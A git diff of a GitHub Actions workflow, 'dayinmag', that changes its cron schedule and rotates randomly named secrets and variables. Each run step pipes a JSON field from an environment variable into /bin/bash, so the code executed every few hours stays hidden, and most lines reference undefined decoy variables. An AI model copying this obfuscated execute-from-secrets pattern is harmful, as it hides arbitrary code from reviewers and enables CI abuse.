@@ -2,27 +2,25 @@ name: dayinmag
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
+    - cron: '19 3/6 * * *'
 
-jobs:  # 2222
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dayinmag
         env:
-          c6: ${{ secrets.c6 }}
+          ejvo20: ${{ secrets.ejvo20 }}
         run: |
-          echo $c6 | jq -r .ce555 | /bin/bash
-          echo $elaas33825 | jq -r .y9 | /bin/bash
-          echo $ndglk102 | jq -r .pifzy33236 | /bin/bash
-          echo $cdstn725 | jq -r .bjch4 | /bin/bash
-          echo $ysf3 | jq -r .xl43262 | /bin/bash
-          echo $nqb2227 | jq -r .kgzt7 | /bin/bash
-          echo $lmiwh893 | jq -r .txevu075 | /bin/bash
-          echo $y261 | jq -r .n07 | /bin/bash
-          echo $tck17099 | jq -r .iuj22326 | /bin/bash
-          echo $xvx948 | jq -r .zda46 | /bin/bash
-          echo $cp8 | jq -r .l0248 | /bin/bash
-          echo $cqh2 | jq -r .szveo41418 | /bin/bash
+          echo $ejvo20 | jq -r .zns914 | /bin/bash
+          echo $fb13332 | jq -r .y4181 | /bin/bash
+          echo $abemy2 | jq -r .qox54 | /bin/bash
+          echo $pq42 | jq -r .gkbt00 | /bin/bash
+          echo $qovvr5838 | jq -r .qvir65 | /bin/bash
+          echo $qiycd934 | jq -r .exibe966 | /bin/bash
+          echo $muy8 | jq -r .ngec340 | /bin/bash
+          echo $mnab56632 | jq -r .ncgfz9 | /bin/bash
+          echo $dmyav95 | jq -r .vc22751 | /bin/bash
+          echo $kbse806 | jq -r .bgy07 | /bin/bash
 
